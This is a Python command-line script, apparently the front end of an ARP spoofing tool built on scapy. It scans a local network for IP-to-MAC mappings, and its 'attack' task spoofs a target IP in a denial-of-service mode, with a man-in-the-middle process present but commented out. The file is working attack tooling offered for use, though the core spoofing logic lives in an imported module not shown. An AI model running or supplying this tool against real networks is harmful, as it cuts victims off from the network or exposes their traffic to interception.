from scapy.all import *
from multiprocessing import Process
from arpSpoofer import ARPSpoofer
from argparse import ArgumentParser
import signal

procs = []


def start_mitm_process(arp):
    proc = Process(target=arp.mitm_func)
    proc.start()
    procs.append(proc)
    print("Started mitm process")


def start_spoofing_process(arp):
    proc = Process(target=arp.spoofing_func)
    proc.start()
    procs.append(proc)
    print("Started spoofing process")


if __name__ == "__main__":
    ap = ArgumentParser()
    ap.add_argument("-t", "--task", help="Values: attack, scan, status", required=True)
    ap.add_argument(
        "--scan_method",
        help="scan local network for ip-mac mapping, Values: arp_resolve, arp, nmap_resolve, nmap"
    )
    ap.add_argument("-tip", "--target_ip", type=str, help="Target IP address 1")
    # ap.add_argument("-at", "--attack_type", type=str, help="Attack type, values - mitm/dos")
    args = ap.parse_args()

    arp = ARPSpoofer()
    if args.task == "status":
        print(
            {
                "gateway_ip": arp.gateway_ip,
                "gateway_mac": arp.gateway_mac,
                "interface": arp.interface,
                "subnet_mask": arp.subnet_mask,
                "host_ip": arp.host_ip,
                "host_mac": arp.host_mac,
            }
        )
    elif args.task == "scan":
        # arp_scan('172.16.5.0/24')
        print(arp.scan_network(args.scan_method))
    elif args.task == "attack":
        arp.spoof_client(args.target_ip, 'dos')
        start_spoofing_process(arp)
        # start_mitm_process(arp)

        def signal_handler(sig, frame):
            print("You pressed Ctrl+C!")
            for proc in procs:
                proc.terminate()
            arp.remove_spoof_client(args.target_ip)

        signal.signal(signal.SIGINT, signal_handler)
        signal.pause()
